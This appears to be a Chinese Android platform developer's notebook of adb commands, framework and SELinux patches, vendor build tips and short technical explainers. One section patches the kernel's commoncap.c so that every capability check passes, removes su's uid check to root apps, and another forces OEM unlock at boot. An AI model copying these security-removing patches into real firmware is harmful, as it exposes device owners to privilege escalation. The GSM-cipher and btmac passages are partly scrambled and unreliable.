2、设置persist.sys.usb.support_ums为true
persist.sys.usb.support_ums=true

3、通过mUsbManager.setCurrentFunction标志位UsbManagerEx.USB_FUNCTION_MASS_STORAGE
private final String ACTION_UMS_OPEN = "android.ums_open";
private final String ACTION_UMS_CLOSE = "android.ums_close";
BroadcastReceiver mUmsReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
     UsbManager mUsbManager = null;
     mUsbManager = (UsbManager) mContext.getSystemService(Context.USB_SERVICE);
     if (ACTION_UMS_OPEN.equals(intent.getAction())) {//打开U盘模式
         mUsbManager.setCurrentFunction(UsbManagerEx.USB_FUNCTION_MASS_STORAGE,true); 
     } else if (ACTION_UMS_CLOSE.equals(intent.getAction())) {//关闭U盘模式
      mUsbManager.setCurrentFunction(UsbManagerEx.USB_FUNCTION_MASS_STORAGE,false); 
     }
    }
};
```

## Android P检测USB插入拔出消息并基于libaums实现读取USB文件

```text
https://blog.csdn.net/Sunxiaolin2016/article/details/93337932
```

## [CMD] 开启/关闭屏幕自动旋转

```text
//disable auto rotation 0/1
adb shell content insert --uri content://settings/system --bind name:s:accelerometer_rotation --bind value:i:0
```

## [CMD] 查看所有已经在运行的程序

```text
adb shell am stack list
```

## [默认值] 修改睡眠时间

```text
frameworks\base\packages\SettingsProvider\res\values\defaults.xml
<integer name="def_screen_off_timeout">2147483647</integer> //android的睡眠时间，2147483647的时间为Long.MAX_VALUE;
```

## 不开移动数据不能发送彩信

```text
vendor/mediatek/proprietary/frameworks/opt/telephony

@@ -52,6 +52,7 @@ import com.mediatek.internal.telephony.MtkGsmCdmaPhone;
 import com.mediatek.internal.telephony.MtkPhoneConstants;

 import java.util.ArrayList;
+import android.os.SystemProperties; // add

 /** DataConnectionExt is default implementation for Data Plugin. */
 public class DataConnectionExt implements IDataConnectionExt {
@@ -82,7 +83,7 @@ public class DataConnectionExt implements IDataConnectionExt {
     @Override
     public boolean isDataAllowedAsOff(String apnType) {
         if (TextUtils.equals(apnType, PhoneConstants.APN_TYPE_DEFAULT) ||
-                TextUtils.equals(apnType, PhoneConstants.APN_TYPE_MMS) ||
+                (!SystemProperties.getBoolean("ro.func.open_nodata_send_mms", false) && TextUtils.equals(apnType, PhoneConstants.APN_TYPE_MMS)) ||  // add for no internet connect to send mm
                 TextUtils.equals(apnType, PhoneConstants.APN_TYPE_DUN)) {
             return false;
         }
```

## [CMD] android如何查看用的是哪个tp ts文件

```text
通过查看 out\target\product\sp9832a_3h10_volte\obj\KERNEL\drivers\input\touchscreen 下面的编译结果就可以了
或者通过 adb shell getevent 得到 adb shell getevent -p
```

## [CMD] 启动YLog

```text
adb shell am start -n  com.sprd.logmanager/.logui.LogMainActivity
```

## [知识点] MUTF编码解释

```text
JAVA中的MUTF-8编码就是UTF-8编码前面加了两个byte表示这个字节串的长度。
比如说字符串"A"的UTF-8编码是【61】，字符串长度为1，那么字符串“A”的MUTF-8编码就是【0,1,61】。
比如说字符串"AAA...AAA"(1024个‘A’)，UTF编码为【61,61,61...61,61,61】，字符串长度为1024，那么它的MUTF-8编码就是【4,0,61,61,61...61,61,61】。

下面贴出C# 里面string和MUTF-8的byte[] 的相互转换函数：

private static byte[]  STRtoMUTF(string str) {
    int len = str.Length;
    byte[]  bb = new byte[2] ;
    bb[0]  = (byte)(len / 256);
    bb[1]  = (byte)(len % 256);
    byte[]  suf = Encoding.UTF8.GetBytes(str);
    return bb.concat(suf).ToArray();//连接函数
}
private static string MUTFtoSTR(byte[]  mutf) {
    int len = (int)mutf[0]  * 256 + (int)mutf[1] ;
    return Encoding.UTF8.GetString(mutf, 2, len);
}
```

## [CMD] android_id的获取???这个东西有什么用???

```text
adb shell settings get secure android_id
```

## [开源] QMUI(简约的ui框架)

```text
https://qmuiteam.com/android
```

## [开源] html 转 pdf 的库

```text
https://wkhtmltopdf.org/
https://github.com/wkhtmltopdf/wkhtmltopdf
```

## [知识点] AOP

```text
AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，通过预编译方式和运行期间动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。
```

## [CMD] 如何快速查找某个 android 模块在哪个 android.mk 文件中???

```text
alias findm="grep -rnws --include='*.[mb]  [kp] ' 'LOCAL_MODULE\|LOCAL_PACKAGE_NAME\|name:'"
或
source lunch pathmod
```

## [OTA] 如何搭建mota服务器????

```text
MTK有文档
```

## AccessibilityService 的学习和使用

```text
https://segmentfault.com/a/1190000019931725?utm_source=tag-newest   Android通过辅助功能 AccessibilityService 实现抢微信红包原理简单介绍
```

## android 9 源码修改直接开放oem解锁

```text
frameworks\base\services\usb\java\com\android\server\usb\UsbDeviceManager.java
添加：

import android.service.oemlock.OemLockManager;
protected void finishBoot() {
    + OemLockManager mOemLockManager = (OemLockManager) mContext.getSystemService(Context.OEM_LOCK_SERVICE);
    + mOemLockManager.setOemUnlockAllowedByUser(true);
    if (mBootCompleted && mCurrentUsbFunctionsReceived && mSystemReady) {
        if (mPendingBootBroadcast) {
            updateUsbStateBroadcastIfNeeded(getAppliedFunctions(mCurrentFunctions));
            mPendingBootBroadcast = false;
        }
    }
}
.....
步骤：
1、拨码烧写模式，全编后全烧
2、拨码运行模式后启动
3、启动完成后重启进入fastboot模式  （reboot bootloader  或 启动后按键盘，进入u-boot命令行模式，打命令：fastboot 0 回车）
4、此时，可以使用fastboot命令或者开始全烧
    a、oem解锁：fastboot oem unlock
    b、查看oem解锁使能：flashing get_unlock_ability，具体可以打命令fastboot oem --help查看，可能不同板子命令不同
```

## [CMD] 获取cpu频率

```text
adb shell cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies
```

## android原生如何修改可以让app获取root权限

```text
首先，你的手机必须是root后的，这个好像一般的手都做不到了，如果你有方法能把手机root了，恭喜你，你的技术很高了，你可以去这个手机厂商的安全部门了。（瞎扯。。。）

然后只需要修改源码两个地方就可以

第一个地方是security/commoncap.c 下

if (ns == cred->user_ns)
            return cap_raised(cred->cap_effective, cap) ? 0 : -EPERM;

修改为

if (ns == cred->user_ns)
            return  0;

第二个地方：

int main(int argc, char** argv) {
//    uid_t current_uid = getuid(); //去掉
//    if (current_uid != AID_ROOT && current_uid != AID_SHELL) error(1, 0, "not allowed");//去掉
这样就OK了

然后验证的方式按照：https://blog.csdn.net/dodod2012/article/details/81082169

https://blog.csdn.net/cau_eric/article/details/103086233
```

## android 后台监听屏幕操作

```text
https://blog.csdn.net/cau_eric/article/details/102803250
```

## android 5.1/6.0/9 系统 默认为中文

```text
在 build\tools\buildinfo.sh 末尾添加：

echo "persist.sys.language=zh"
echo "persist.sys.country=CN"
echo "persist.sys.localevar="
echo "persist.sys.timezone=Asia/Shanghai"
echo "ro.product.locale.language=zh"
echo "ro.product.locale.region=CN"
亲测可用，其他像改full_base.mk的方法我试了没有用！

参考：
https://www.jianshu.com/p/b87805d772de
```

## 让线程暂停的另一种方法

```text
可以使用 android.os.SystemClock.sleep(1000);
优点是不需要像 Thread.sleep(1000); 要try catch，内部其实也是使用 Thread.sleep() 来实现的，其中已经包含了 try catch
public static void sleep(long ms) {
    long start = uptimeMillis();
    long duration = ms;
    boolean interrupted = false;
    do {
        try {
            Thread.sleep(duration);
        } catch (InterruptedException e) {
            interrupted = true;
        }
        duration = start + ms - uptimeMillis();
    } while (duration > 0);

    if (interrupted) {
        // Important: we don't want to quietly eat an interrupt() event,
        // so we make sure to re-interrupt the thread so that the next
        // call to Thread.sleep() or Object.wait() will be interrupted.
        Thread.currentThread().interrupt();
    }
}
```

## [性能] 开机优化

```text
1.1 裁剪加载类
./frameworks/base/preloaded-classes 少加载会影响 App 启动速度 , 此地优化空间不大
./frameworks/base/core/res/ 会被打包成 framework-res.apk，确保没有冗余的资源图片，可以挨个检查图片、XML是否在系统中有用到；

三 开机动画
bootanimation 时间
1. 最好不要超过 system_server 启动时间 (11s) ( 63385.657304 : Android:SysServerInit_START 到 Android:SysServerInit_END)
2. 不要播放 mp3
3. bootanimation.zip 图片越少越好

通过修改–compiler-filter 为 speed、quick、speed-profile来提高 APK 的启动速度；
speed 模式优化的类较多，这时优化后的vdex、odex的文件较大，应用启动过程包括映射apk文件的过程，文件偏大导致有一定的时间损耗；
但 speed 模式优化后，Java类执行更快；所以这个需要针对具体的应用多次验证，没有普适性；
```

## [CMD] P平台执行sh脚本的方式

```text
随着Android版本的不断升级，系统的安全性逐渐增强，导致之前在app或系统服务中可以被执行的sh脚本现在也无法运行了。本文总结了Android平台执行sh脚本的一种通用方式。

1、添加sh文件到 /system/bin 或 /vendor/bin 目录

#!/vendor/bin/sh
 
echo "preload color config start"
 
chmod 777 /data/local/config.xml
chown system.system /data/local/config.xml
 
...
2、在 /device/qcom/sepolicy/vendor/file_contexts 中给sh文件打安全标签（type）

# For preload color config xml
/(vendor|system/vendor)/bin/init\.preload\.colorconfig\.sh     u:object_r:qti_init_shell_exec:s0
3、添加服务运行时的对应的安全域 （domain）

高通平台的sh脚本文件通常运行在 qti_init_shell 安全域，如果希望添加的脚本服务运行在这个安全域中，打安全标签时按照步骤2执行即可。

如果添加的脚本服务需要执行比较特殊的操作，就需要运行在自定义的安全域中，如 foo_domain，此时sh脚本文件的安全标签就应该是修改为 u:object_r:foo_domain_exec:s0。

4、添加安全域 foo_domain

添加文件 /device/qcom/sepolicy/vendor/foo_domain.te

# foo domain
type foo_domain, domain;
type foo_domain_exec, exec_type, vendor_file_type, file_type;
 
init_daemon_domain(foo_domain)
#permissive foo_domain;
5、在 rc 文件中添加运行sh脚本的服务

# Exec init.preload.colorconfig.sh
service preload-cc-sh /vendor/bin/sh /vendor/bin/init.preload.colorconfig.sh
    class late_start
    user root
    group system graphics
    oneshot
    disabled
6、启动脚本服务

在rc文件中启动 preload-cc-sh 服务

on property:sys.bootcompleted=1
    start preload-cc-sh
在java文件中启动服务

SystemProperties.set("ctl.start", "preload-cc-sh");
7、添加te权限

步骤4中，在 foo_domain.te 文件中添加了 permissive foo_domain；语句，该语句使得脚本服务运行在permissive模式，同时输出脚本服务运行时的avc审计。然后我们就可以按照avc语句来添加te权限到 foo_domain.te 中。

调试完成后，记得注释掉 permissive 语句。

8、最后，不同Android平台和版本可能存在差异，不过这也是正常的，我们可以参考谷歌自带的sh服务。

在 /system/core/rootdir/init.rc 文件中。（源码才是最好的老师）

service flash_recovery /system/bin/install_recovery.sh
    class main
    oneshot
```

## [prop] Android Q平台上vendor进程访问system属性的一种实现方式

```text
Google的Treble计划实现了system和vendor的分离，目的是降低Android系统的碎片化。初衷是好的，但是实际效果一般，对开发者的影响是限制更多，实现更复杂，系统的运行效率更慢。

突然有一天发现vendor分区中的进程无法访问ro.serialno属性了，研究发现是Treble中的SELinux进行了限制，也是为了实现system和vendor的分离。但是，我们又不能不访问，下面给出了一种实现方式。

以高通平台为例来说明。高通平台的策略路径为 /device/qcom/sepolicy，高通平台和手机厂商的修改通常会放到vendor目录下。

1、新增属性 vendor.serialno。Q平台对新增属性有规定，必须以“ro.vendor.”、“vendor.”、“persist.vendor.” 开头；

2、增加一个rc文件（prop_sync.rc），实现 ro.serialno 和 vendor.serialno 的同步；

新建文件 - /device/qcom/msm8937/prop_sync.rc
on property:ro.serialno=*
    setprop vendor.serialno ${ro.serialno}
 
在 /device/qcom/msm8937.mk 添加编译
PRODUCT_COPY_FILE += device/qcom/msm8937/prop_sync.rc:/system/etc/init/prop_sync.rc

3、给属性 vendor.serialno 打安全标签；
在 /device/qcom/sepolicy/vendor/property_contexts 中增加如下语句：
vendor.serialno        u:object_r:exported_default_prop:s0

4、添加te策略，使得vendor进程可以访问 vendor.serialno 属性，foo_vendor是vendor进程的安全域；
get_prop(foo_vendor, exported_default_prop)

5、编译和调试；
make selinux_policy
adb push out/target/product/xx/vendor/etc/selinux/precompiled_sepolicy /vendor/etc/selinux/precompiled_sepolicy
adb push out/target/product/xx/vendor/etc/selinux/vendor_property_contexts /vendor/etc/selinux/vendor_property_contexts
adb reboot
```

## Android framework 定制应用接口和服务

```text
在系统开发中，定义api是很常见的。因为系统的很多功能是不对外开放的，系统可以通过定义api给应用层调用，方便实现相关的功能。关于定义接口，可参考系统相关服务，如AMS,PMS等模块的实现方式，将接口定义跟具体实现分离出来，当第三方应用需要二次进行开发时，只需要提供接口类封装的jar即可，且具体实现对应用是透明的。
定义思路

jar包中的类 
ApiManager.java 接口类，作为 应用调用的入口
IApiManager.aidl aidl,与功能实现的类进行通信
ApiManagerImpl.java ApiManager的实现类，下发控制指令与系统通信的控制接口
.具体文件路径如下：
ApiManager.java 和 IApiManager.aidl ：
frameworks/base/core/java/com/android/server
ApiManagerImpl.java：
frameworks/base/services/core/java/com/android/server

我们只是定义了定义文件路径，如果要将它编译成jar包，还需要在 mk 文件中添加规则。修改frameworks/base/Android.mk，在frameworks.jar的规则中加入声明。

LOCAL_SRC_FILES := \
 core/java/com/android/server/IApiManager.aidl 
在frameworks/base/Android.bp中加入aidl定义

core/java/com/android/server/IApiManager.aidl
在frameworks/base/Android.mk中添加新的module定义，用于编译可供第三方接入的jar包，加在 mk 的 build之前，而不是文件最后。

include $(CLEAR_VARS)
LOCAL_SRC_FILES := \
 core/java/com/android/server/IApiManager.aidl \
 core/java/com/android/server/ApiManager.java
LOCAL_MODULE := apimanager
include $(BUILD_STATIC_JAVA_LIBRARY)
在build/target/product/core.mk 或 device的device.mk中加入指令，在编译固件时将apimanager作为目标module进行编译（如果没有做这一步则编译固件时不会生成apimanager.jar，只能手动编译模块）

PRODUCT_PACKAGES += apimanager
然后直接 make 或 make apimanager 。 编译完成后，jar的位置out/target/common/obj/JAVA_LIBRARIES/apimanager_intermediates/classes.jar ，将这个jar包导入到Android studio中，导入之后并不能直接调用，还需要配置系统签名(平台不同系统签名不同)。

接口类和实现类设计

aidl设计比较简单，可把它理解为一个提供方法的接口

interface IApiManager {
     // 函数名
}
再看接口实现类ApiManagerImpl.java，继承aidl并实现里面的方法，需声明apimanager，让其他 服务和应用可以访问该服务。

public class ApiManagerImpl extends IApiManager.Stub {

    public static class Lifecycle extends SystemService {
        private ApiManagerImpl mApiManager;

        public Lifecycle(Context context) {
            super(context);
        }

        @Override
        public void onStart() {
            mApiManager = new ApiManagerImpl(getContext());
            publishBinderService("apimanager", ApiManagerImpl);
        }
    }
    public ApiManagerImpl(Context context) {
         // 实例化对象
    }   
    
    @Override
    // aidl中的函数
}
接口类也比较简单，就是调用实现类中的函数，不是直接实例化ApiManagerImpl，而是通过 aidl 获取服务类。

public class ApiManager {
    private final IApiManager mService;
    private static ApiManager instance;
    private Context mContext;
    private final static Object syncObj = new Object();

    public ApiManager(Context context) {
        Log.d(TAG, "ApiManager created");
        mService = IApiManager.Stub.asInterface(ServiceManager.getService("apimanager"));
        mContext = context;
    }

    public static ApiManager getInstance(Context context) {
  synchronized(syncObj) {
   if (instance == null) {
    instance = new ApiManager(context);
   }
   return instance;
  }
 }

 函数名 {
  try {
   mService.函数名;
  } catch (RemoteException e) {
   e.printStackTrace();
  }
 }
}
这样，一个完整的服务架构算是完成了，之后如果应用需要系统提供功能接口，只需要按步骤添加相关函数实现就行了。
```

## [工具] BugReport 概述

```text
https://blog.csdn.net/weixin_43361818/article/details/107757459
```

## [工具]  [性能] Simpleperf 它是针对Android平台的一个 native 层性能分析工具

```text
system/extras/simpleperf/

https://blog.csdn.net/weixin_43361818/article/details/107522937
https://blog.csdn.net/weixin_43361818/article/details/107556421

https://blog.csdn.net/tq08g2z/article/details/77311712

TODO : simpleperf怎么用？log怎么分析？
```

## [知识点] gist 是个什么玩意儿???

```text
Gist 是 Github 推出的基于 Git 的代码片段管理服务。用户可以提交自己的代码片段或任意的文本，可以作为个人的代码管理库、文档管理库等。
通过gists，你可以分享单一的文件，部分代码片段甚至整个应用程序代码给其他人。
```

## Java字节码框架asm 是什么??怎么用???有什么用???

```text
ASM是一个通用的 Java 字节码操控和分析框架。它可以用于修改已有的类也可以直接生成类。ASM 提供了一些常用的字节码转换和分析算法，从中可以构建自定义的复杂转换和源码分析工具。ASM提供了与其他 Java 字节码框架类似的方法，但是更注重性能。因为它被设计和实现成尽可能小和快，所以非常适用于动态系统（当然也可以用于静态的方式，例如在编译器中）。

总之ASM让我们可以对 Java 字节码做几乎任何事情。例如获取类文件的详细信息、动态修改或生成一个类等。

Java 是一门静态语言，所有的类在编译时就已经给定了，但是有很多情况下，我们需要在运行时动态地生成或者增强一些类。这时候 ASM 就派上用场了。

为什么要用 ASM
最典型的应用场景是 AOP（面向切面编程）。实际开发中我们会发现，项目中经常存在这么一类零散而又耦合的代码。例如打印方法耗时、方法权限控制等。

假设这样的场景，团队规定对所有类的关键的方法都必须打印方法执行耗时，如果方法执行抛出异常则必须把参数也打印出来。

而对这类需求，用传统的做法我们会发现整个项目充斥着下面这段重复的模板代码：

try {
 long start = System.currentTimeMillis();
 // 业务代码
 ...
 long timeConsumed = start - System.currentTimeMillis();
 log.info("方法 {} 耗时: {}", "doSomething", timeConsumed)
} catch(Exception e){
    log.warn("方法 {} 执行抛出异常:{}, 参数: {}", "doSomething", e.getMessage());
    throw e;
}
根据 DRY(Don’t Repeat Yourself) 原则，当我们发现项目中不断出现重复代码时，肯定是哪里出了问题，该优化了。就这个案例来说，如果我们可以在编译或者运行时在业务代码的前面和后面自动加上我们定义好的几行日志代码，那么这些重复的代码就能统统消灭掉了。

AOP 就是为了解决这类问题而生的，它能让我们在方法的执行前后添加我们需要添加的代码，甚至改变方法的执行流程。AOP 的实现跟字节码操控密切相关，SpringAOP 是基于动态代理和CGLIB实现的，而CGLIB是基于ASM实现的。所以我们非常有必要学习字节码操控技术。这个领域使用最广泛的框架就是 ASM。

从 HelloWorld 开始
HelloWorld 是所有人在学习一门语言时写的第一个程序，而学习任何一项新技术时，HelloWorld 也是最好的敲门砖。所以让我们用 ASM 来写一个 HelloWorld 程序吧！

还记得这个 Java 的 HelloWorld 吗？

public class HelloWorld{
    public static void main(){
        System.out.println("HelloWorld!");
    }
}
我们不直接写上面这个类，而是使用 ASM 框架来动态生成：

import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

/**
 * @author dadiyang
 * @date 2019/1/13
 */
public class HelloWorldByAsm {
    
    public static void main(String[]  args) throws Exception {
        // 生成二进制字节码
        byte[]  bytes = generate();
        // 使用自定义的ClassLoader
        MyClassLoader cl = new MyClassLoader();
        // 加载我们生成的 HelloWorld 类
        Class<?> clazz = cl.defineClass("com.dadiyang.asm.HelloWorld", bytes);
        // 反射获取 main 方法
        Method main = clazz.getMethod("main", String[] .class);
        // 调用 main 方法
        main.invoke(null, new Object[] {new String[] {}});
    }

    private static byte[]  generate() {
        ClassWriter cw = new ClassWriter(0);
        // 定义对象头：版本号、修饰符、全类名、签名、父类、实现的接口
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, "com/dadiyang/asm/HelloWorld",
                null, "java/lang/Object", null);
        // 添加方法：修饰符、方法名、描述符、签名、抛出的异常
        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, "main",
                "([Ljava/lang/String;)V", null, null);
        // 执行指令：获取静态属性
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        // 加载常量 load constant
        mv.visitLdcInsn("HelloWorld!");
        // 调用方法
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        // 返回
        mv.visitInsn(Opcodes.RETURN);
        // 设置栈大小和局部变量表大小
        mv.visitMaxs(2, 1);
        // 方法结束
        mv.visitEnd();
        // 类完成
        cw.visitEnd();
        // 生成字节数组
        return cw.toByteArray();
    }
}
/**
 * 自定义ClassLoader以支持加载字节数组形式的字节码
 * @author dadiyang
 */
class MyClassLoader extends ClassLoader {
    public Class<?> defineClass(String name, byte[]  b) {
        // ClassLoader是个抽象类，而ClassLoader.defineClass 方法是protected的
        // 所以我们需要定义一个子类将这个方法暴露出来
        return super.defineClass(name, b, 0, b.length);
    }
}
这时执行程序就会输出 HelloWorld 了。是不是很神奇？我们并没有写一个真正的 HelloWorld.java 文件，也没有在运行之前对其进行编译，但是 ASM 让我们有能力在运行的过程中动态生成一个新的类并加载和运行它。

关于 ASM 入门和API的使用，建议阅读官方的 用户手册。这个手册写得非常不错。
```

## [知识点] 什么是三段式耳机??什么是四段式耳机??

```text
三段式就是没有Mic的耳机插口，从上到下分别是左声道L、右声道R和GND，而四段式耳机口就多了一个Mic信号，有两种标准，一种是左声道L、右声道R、GND、MIC，另一种是左声道L、右声道R、MIC、GND，比如Iphone手机接口的标准和其他手机使用的标准不一样，就会导致苹果耳机不能用在其他手机上。

参考文章：http://jingyan.baidu.com/article/93f9803f085796e0e46f5588.html
```

## [知识点] 手机加密算法??? GEA???

```text
GSM常用的加密算法bai有A3、A5、A8。
1、A3 Algorithm（A3 算法）
A3算法（A3 Algorithm）是用du于对全球移动通讯系zhi统（GSM）蜂dao窝通信进行加密的一种算法。实际上，A3 和 A8 算法通常被同时执行（也叫做 A3/A8）。一个 A3/A8 算法在用户识别（SIM）卡和在 GSM 网络认证中心中执行。它被用于鉴别用户和产生加密语音和数据通信的密钥，正如在 3GPP TS 43.020（Rel-4 前的 03.20）定义的一样。尽管实例执行是可行的，但 A3 和 A8 算法被认为是个人 GSM 网络操作者的事情。
A3/A8
A3/A8 是指两个算法，A3 和 A8，是用于对全球移动通信系统（GSM）蜂窝通信进行加密的算法。因为 A3 和 A8 算法通常同时执行，因此，它们通常被叫做 A3/A8，一个 A3/A8 算法在用户识别（SIM）卡和在 GSM 网络认证中心中被执行。正如在 3GPP TS 43.020（Rel-4 前的 03.20）中定义的一样，它通常用于认证这个用户和产生一个加密语音和数据通信的密码。尽管实例执行是可行的，但 A3 和 A8 算法被认为是个人 GSM 网络操作者的事情。
2、A5 Algorithm（A5 算法）
A5 算法（A5 Algorithm）被用于加密全球移动通信系统（GSM）蜂窝通信。一个 A5 加密算法在电话听筒和基站之间搅乱用户语音和数据传输来提供私密。一个 A5 算法被在电话听筒和基站子系统（BSS）两者中执行。
3、A8 Algorithm（A8 算法）
A8算法（A8 Algorithm）通常被用于全球信息系统（GSM） 蜂窝通信的加密。在实践中，A3 和A8 算法，也叫做 A3/A8，一般被同时执行。一个 A3/A8 算法在用户识别（SIM）卡和在 GSM 网络认证中心中被执行。它通常用于认证这个用户和产生一个加密语音和数据通信的密钥，正如在 3GPP TS 43.020（Rel-4 前的 03.20）中定义的一样。尽管实例执行是可行的，但 A3 和 A8 算法被认为是个人 GSM 网络操作者的事情。
```

## [知识点] DTMF

```text
DTMF： 即Double Tone Multiple Frequency，双音多频信号
DTMF信号的产生原理：双音频信号是两个正弦波信号的叠加，选定两个频率f1和f2后很容易地得到这种信号的数学表达式
DTMF信号特点：
1.所有音频都位于人的可听范围内，因此按键下去时人可以听到。 
2.8个频率中没有一个频率是其他任意一个频率的倍数。 
3.任意两个频率的组合，相加或相减都不等于其他任意一个频率。
这些特性不仅简化了DTMF信号的解码同时也降低了DTMF误检的概率。
```

## [知识点] 3GPP

```text
3GPP的全称是3rd Generation Partnership Project，中文叫第三代合作伙伴计划，成立于1998年12月，最初的目标是为了制定3G技术规范。其制定的3G和4G技术规范现在都成了全球通用的标准， 5G技术方案的研究制定也正在进行。
```

## [知识点] CE

```text
CE标志被定义为欧盟（EU）强制性合格标志，用于管制自1985年以来在欧洲经济区（EEA）内销售的商品.CE标志代表制造商声明产品符合欧盟新方法指令。这些指令不仅适用于欧盟内部的产品，也适用于在欧洲经济区内生产或设计销售的产品。这使得CE标记在全世界范围内都可识别，即使对于那些不熟悉EEA的人也是如此。

CE认证作用？
CE标志是许多产品必须贴在欧洲市场上才能销售的标志。商标表示产品：
满足相关欧洲产品指令的要求
满足相关公认的欧洲统一性能和安全标准的所有要求
适合其目的，不会危及生命或财产
ce标志的存在进一步表明，支持商标使用的适当技术文件可供使用，并可由制造商，进口商或负责将产品应用于欧盟市场的人员提供。
```

## [sprd] 展讯productinfo

```text
展讯的蓝牙地址存在两个地方：/productinfo/btmac.txt和/data/misc/bluedroid/btmac.txt

produnctinfo中的btmac.txt是在产线用产线工具写入生成，恢复出厂设置不会消失

data中的btmac.txt是开机产生，恢复出厂设置会消失。

展讯蓝牙地址生成方法是

1.判断productinfo中是否存在bbtmac.txt。

所以如果机器在产线没有写入地址，则开机会随tmac.txt

2. 如果存在则读取写入data中的btmac.txt

3. 如果不存在则随机生成蓝牙地址写入机生成一个地址，恢复出厂设置，生成的data下的btmac.txt会清除，再次开机又会生成一个新的蓝牙地址。

解决方案：用产线工具写入mac，或者在productinfo下生成btmac.txt文件。
```

## [sprd] 展讯平台读写SN号

```text
public void writeTestCaseResultIntoSN2(String writeStr, int position, int len) {
    String sn = null;
    String sn2 = null;
    int SN2Size = 23;

    if (len != writeStr.length()) {
        // write string's length is not identical
        return;
    }

    // Get the whole sn2 string first
    com.spreadst.validationtools.engtools.engfetch mEf = new com.spreadst.validationtools.engtools.engfetch();
    int dataSize = 2048;
    byte[]  inputBytes = new byte[dataSize] ;
    int showlen = mEf.enggetphasecheck(inputBytes, dataSize);
    Log.d("writeTestCaseResultIntoSN2", "showlen = " + showlen);

    sn = new String(inputBytes, 0, showlen);
    Log.d("writeTestCaseResultIntoSN2", "sn = " + sn);

    sn = sn.replaceAll("(?s)DOWNLOAD.*", "").trim();
    Log.d("writeTestCaseResultIntoSN2", "sn = " + sn);

    String array[]  = sn.split("sn2:");
    sn2 = array[array.length - 1] ;

    // modify the sn2 string
    String str1 = sn2.substring(0, position);
    String str2 = sn2.substring(position + len, sn2.length());
    String sn2New = str1 + writeStr + str2;

    // write the sn2 string
    mEf.engwritesn2(sn2New.getBytes(), SN2Size);
}

int engapi_writesn2(void* buf, int size) {
    int fd = 0;
    int ret = 0;
    int readsize = 0;
    char *str = buf;
    char ATCmd[1024]  = {0};
    char temp[1024]  = {0};
    SP09_PHASE_CHECK_T phasecheck = {0};
    SP09_PHASE_CHECK_T phasecheckModify = {0};
 
 
    ENG_LOG("engapi_writesn2: buf = %x, size = %d", buf, size);
    if ((buf == NULL) || (size != SP09_MAX_SN_LEN))
    {
        return 22;
    }
 
    ENG_LOG("engapi_writesn2: 2");
    ret = eng_getphasecheck(&phasecheck);
    ENG_LOG("engapi_writesn2: 3");
    memcpy(&phasecheckModify, &phasecheck, sizeof(SP09_PHASE_CHECK_T));
 
    ENG_LOG("engapi_writesn2: ret = %d", ret);
    if (ret == 0)
    {
        memcpy(&phasecheckModify.SN2, buf, size);
        ENG_LOG("engapi_writesn2: SN2 = %s", phasecheckModify.SN2);
        memcpy(&phasecheck, &phasecheckModify, sizeof(SP09_PHASE_CHECK_T));
        fd = engapi_open(0);
        ENG_LOG("engapi_writesn2: fd = %d", fd);
        if(fd < 0)
        {
            return 22;
        }
 
        HexConvertAscii(&phasecheck, sizeof(SP09_PHASE_CHECK_T), temp);
        sprintf(ATCmd, "%d,%d,%s %x, \"%s\", %d", ENG_AT_NOHANDLE_CMD, 1, "AT+SPPRODUCT=", 0, temp, strlen(temp));
        ENG_LOG("engapi_writesn2: 4");
        engapi_write(fd, ATCmd, sizeof(ATCmd));
        ENG_LOG("engapi_writesn2: 5");
        memset(ATCmd, 0, sizeof(ATCmd));
        ENG_LOG("engapi_writesn2: 6");
        engapi_read(fd, ATCmd, strlen(ATCmd));
        ENG_LOG("engapi_writesn2: ATCmd = %s", ATCmd);
        engapi_close(fd);
        readsize = strlen(ATCmd);
        return readsize;
    }
    else
    {
        return 22;
    }
}
```

## [sprd]  [make] android 8.0 展讯平台系统编译问题点

```text
编译系统异常点
1. 如何编译参考邮件
        1. 解压 idh.code.tgz 得到 idh.code 文件夹
        2. 解压 conf-sharkle.tar.gz 得到 device 文件夹
        3. 将 device/sprd 文件夹拷贝到 idh.code/device 文件夹下，
        4. 按照安卓正常编译
注：        
        1.     proprietories-sl8541e_1h10_gofu_osea-user.zip 或者 proprietories-sl8541e_1h10_gofu_osea-userdebug.zip 必须存在
        2.  lunch 选择 sl8541e_1h10_gofu_osea 或者 sl8541e_1h10_gofu_osea-userdebug 
        3.  解压对应的 proprietories-sl8541e_1h10_gofu_osea-user.zip 或者 proprietories-sl8541e_1h10_gofu_osea-userdebug.zip (根据lunch 选择使用哪个文件夹中的文件) ，将其中的 sml.bin 和 tos.bin 俩个文件放到 idh.code/out/target/product/${BOARD_NAME} 下
        4.  进行 make 操作        
2. pack 打包
        阅读 pac_script3.rar 中的 readme 文档

3. 编译问题及解决
3.1
    [  0% 719/76023]  Lex: applypatch <= bootable/recovery/edify/lexer.ll
    FAILED: out/target/product/sl8541e_1h10_go/obj/STATIC_LIBRARIES/libedify_intermediates/lexer.cpp 
    /bin/bash -c "prebuilts/misc/linux-x86/flex/flex-2.5.39 -oout/target/product/sl8541e_1h10_go/obj/STATIC_LIBRARIES/libedify_intermediates/lexer.cpp bootable/recovery/edify/lexer.ll"
    flex-2.5.39: loadlocale.c:130: _nl_intern_locale_data: Assertion `cnt < (sizeof (_nl_value_type_LC_TIME) / sizeof (_nl_value_type_LC_TIME[0] ))' failed.
    Aborted (core dumped)
    解决：
        export LC_ALL=C 
3.2 
    FAILED: out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/with-local/classes.dex 
    /bin/bash out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/with-local/classes.dex.rsp
